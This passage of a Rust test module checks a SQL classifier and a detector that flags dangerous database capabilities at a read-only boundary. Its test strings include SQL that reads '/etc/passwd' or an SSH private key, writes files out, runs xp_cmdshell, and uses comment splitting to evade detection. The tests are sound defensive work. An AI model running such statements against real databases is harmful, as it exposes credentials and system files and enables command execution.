        // EXPLAIN ANALYZE of a real read stays a read.
        let read = classify_sql("EXPLAIN ANALYZE SELECT * FROM users");
        assert!(read.read_only);
    }

    #[test]
    fn classifier_rejects_utility_writes() {
        for sql in [
            "COPY users TO '/tmp/u.csv'",
            "VACUUM users",
            "CALL rebuild_index()",
            "DO $$ BEGIN DELETE FROM users; END $$",
            "LOCK TABLE users IN EXCLUSIVE MODE",
            "PRAGMA journal_mode = WAL",
        ] {
            let decision = classify_sql(sql);
            assert!(!decision.read_only, "utility write leaked as read: {sql}");
        }
        // Bare read pragmas stay reads; `PRAGMA name(arg)` with an identifier
        // arg does not parse under sqlparser and falls back to Unknown — the
        // same fail-closed outcome as before this change.
        assert!(classify_sql("PRAGMA table_info").read_only);
    }

    #[test]
    fn dangerous_capability_flags_copy_file_paths_and_unload() {
        assert!(detect_dangerous_capability("COPY users TO '/tmp/u.csv'", None).is_some());
        assert!(detect_dangerous_capability("COPY users FROM '/etc/passwd'", None).is_some());
        assert!(
            detect_dangerous_capability("UNLOAD (SELECT * FROM t) TO 's3://b/'", None).is_some()
        );
    }

    #[test]
    fn dangerous_capability_sees_through_comment_evasion() {
        // Comments must not hide a capability: `/**/` splitting a name or a
        // clause, `--`/`#` line comments doing the same.
        let cases = [
            "SELECT pg_/**/read_file('/etc/passwd')",
            "SELECT * FROM users INTO/**/OUTFILE '/tmp/u.csv'",
            "SELECT * FROM users INTO OUT/**/FILE '/tmp/u.csv'",
            "EXEC xp_/**/cmdshell 'whoami'",
            "LOAD# evade\nDATA INFILE '/etc/passwd' INTO TABLE t",
            "SELECT * FROM read_/**/csv('/home/u/.ssh/id_rsa')",
            "SELECT * FROM open/**/rowset(BULK '/etc/passwd', SINGLE_CLOB) AS x",
        ];
        for sql in cases {
            assert!(
                detect_dangerous_capability(sql, None).is_some(),
                "comment evasion bypassed detection: {sql}"
            );
        }
    }

    #[test]
    fn dangerous_capability_ignores_comments_and_literals() {
        // A dangerous name inside a comment or a string literal is not a call.
        let clean = [
            "SELECT id FROM users -- pg_read_file('/etc/passwd')",
            "SELECT id FROM users /* INTO OUTFILE '/tmp/x' */",
            "SELECT 'xp_cmdshell runs commands' AS note",
            "SELECT $$ read_csv $$ AS body",
        ];
        for sql in clean {
            assert!(
                detect_dangerous_capability(sql, None).is_none(),
                "false positive on comment/literal: {sql}"
            );
        }
    }

    #[test]
    fn attach_classifies_as_session_not_schema() {
        // ATTACH mounts an external file/URI — it must fail the read-only
        // boundary (Session) instead of passing as a schema statement.
        let sqlite = classify_sql("ATTACH DATABASE ':memory:' AS aux");
        assert_eq!(
            sqlite.statements[0].kind,
            SqlStatementKind::Session,
            "SQLite ATTACH should be Session"
        );
        assert!(!sqlite.read_only);
        assert!(!sqlite.has_schema_mutation);

        let duckdb = classify_sql_with_dialect(
            "ATTACH 's3://bucket/db.duckdb' AS remote",
            Some(DatabaseType::DuckDB),
        );
        assert_eq!(
            duckdb.statements[0].kind,
            SqlStatementKind::Session,
            "DuckDB ATTACH should be Session"
        );
        assert!(!duckdb.read_only);
    }
}
